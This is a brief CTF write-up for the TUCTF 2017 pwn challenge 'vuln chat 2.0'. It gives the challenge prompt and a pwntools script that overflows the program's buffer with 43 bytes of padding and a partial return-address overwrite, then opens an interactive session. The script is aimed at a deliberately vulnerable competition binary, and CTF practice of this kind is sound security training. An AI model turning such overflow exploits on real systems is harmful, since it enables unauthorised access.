---
title: "TUCTF 2017 - vuln chat 2.0 (Pwn)"
header:
  overlay_image: /assets/images/tuctf2017/vulnchat2/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Life is Strange Stills by Me"
tags:
  - tuctf2017
  - writeup
  - pwn
---

Pwnable.

## Challenge Description

#### Points

100

#### Description

```
Djinn has got some new intel for us. And I think he's giving us a second chance.
But he will only speak with you. Let's see what he's got to say.

nc vulnchat2.tuctf.com 4242
```

## Solution

```python
from pwn import *
import time

def main():
    # p = process("./vuln-chat2.0")
    p = connect("vulnchat2.tuctf.com", 4242)

    p.sendline("A")

    time.sleep(1)
    p.sendline("A"*43 + "\x72\x86")

    p.interactive()

if __name__ == '__main__':
    main()
```
